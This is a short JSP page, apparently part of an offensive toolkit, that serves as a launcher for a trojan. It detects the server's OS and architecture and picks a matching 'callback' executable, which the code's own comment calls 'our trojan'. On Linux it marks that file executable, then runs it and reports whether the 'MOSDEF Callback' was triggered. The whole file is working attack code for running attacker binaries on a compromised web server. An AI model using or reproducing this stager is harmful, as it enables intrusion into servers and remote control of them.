<%@ page import="java.util.*,java.io.*"%>
<HTML>
    <BODY>	
		<%	
			String osArch = "x86";
			String osName = "windows"; 
			String current_path = request.getSession().getServletContext().getRealPath("/");
			out.println("Current JSP path: " + current_path + "<p>");

			try {
				osName = System.getProperty("os.name").toLowerCase().split(" ")[0];
			}
			catch (Exception e){}
			
			try {
				osArch = System.getProperty("os.arch");				
			}
			catch (Exception e){}
			
			String callback_filename = "callback_" + osName + "_X86.exe";
			if (osArch.indexOf("64") != -1)
				callback_filename = "callback_" + osName + "_X64.exe";
				
			try {    
				if (osName.equals("linux")) { // in linux we must make sure our trojan is executable
					Process p = Runtime.getRuntime().exec("chmod +x " + current_path + callback_filename);
				}
			}
			catch(Exception e){}
			
			try {    
				Process p = Runtime.getRuntime().exec(current_path + callback_filename);
				out.println("MOSDEF Callback successfully triggered");
			}
			catch(Exception e){
				out.println("MOSDEF Callback execution failed!<p>");
                out.println(e);
			}
		%>
	</BODY>
</HTML>
